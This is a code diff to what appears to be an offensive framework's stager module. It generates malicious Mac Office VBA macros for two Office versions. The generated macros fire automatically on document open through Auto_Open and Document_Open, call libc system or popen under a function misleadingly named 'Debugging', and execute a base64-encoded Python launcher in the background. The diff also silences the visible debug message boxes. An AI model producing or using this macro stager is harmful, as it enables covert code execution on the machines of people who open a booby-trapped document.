@@ -45,6 +45,11 @@ class Stager:
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'Version' : {
+                'Description'   :   'Version of the Office. Old (Versions older than 15.26) will use system to execute the payload and New (Versions 15.26 and newer) will use popen to execute the payload. Defaults to new',
+                'Required'      :   True,
+                'Value'         :   'new'
             }
         }
 
@@ -57,7 +62,7 @@ class Stager:
             option, value = param
             if option in self.options:
                 self.options[option]['Value'] = value
-    
+
 
     def generate(self):
         def formStr(varstr, instr):
@@ -77,6 +82,7 @@ class Stager:
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
+        version = self.options['Version']['Value']
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
@@ -88,50 +94,59 @@ class Stager:
         # render python launcher into python payload
         pylauncher = pylauncher.replace("\"", "\"\"")
         for match in re.findall(r"'(.*?)'", pylauncher, re.DOTALL):
-            payload = formStr("str", match)
+            payload = formStr("cmd", match)
 
-            macro = """
-#If Mac Then
-    #If MAC_OFFICE_VERSION >= 15.33 Then
-        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String) As LongPtr
-    #Else
+            if version == "old":
+                macro = """
         #If VBA7 Then
             Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
         #Else
             Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
         #End If
-    #End If
-#End If
+        
+        Sub Auto_Open()
+            'MsgBox("Auto_Open()")
+            Debugging
+        End Sub
+        
+        Sub Document_Open()
+            'MsgBox("Document_Open()")
+            Debugging
+        End Sub
+        
+        Public Function Debugging() As Variant
+            On Error Resume Next
+                    #If Mac Then
+                            Dim result As Long
+                            Dim cmd As String
+                            %s
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                    #End If
+        End Function""" %(payload)
+            else:
+                macro = """
+        Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
+        
+        Sub Auto_Open()
+            'MsgBox("Auto_Open()")
+            Debugging
+        End Sub
+        
+        Sub Document_Open()
+            'MsgBox("Document_Open()")
+            Debugging
+        End Sub
+        
+        Public Function Debugging() As Variant
+            On Error Resume Next
+                    #If Mac Then
+                            Dim result As LongPtr
+                            Dim cmd As String
+                            %s
+                            'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+                            result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &", "r")
+                    #End If
+        End Function""" % (payload)
 
-Sub Auto_Open()
-    MsgBox("Auto_Open()")
-    Debugging
-End Sub
-
-Sub Document_Open()
-    MsgBox("Document_Open()")
-    Debugging
-End Sub
-
-Public Function Debugging() As Variant
-    On Error Resume Next
-            #If Mac Then
-                'Mac Rendering
-                If Val(Application.Version) >= 15.33 Then
-                    Dim result As LongPtr
-                    Dim cmd As String
-                    %s
-                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                    result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
-                Else
-                    Dim result2 As Long
-                    Dim cmd2 As String
-                    %s
-                    MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
-                    result2 = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd2 & \" \\\"\"));"" | python &")
-                End If
-
-            #End If
-End Function""" %(payload, payload)
-
-            return macro
+        return macro
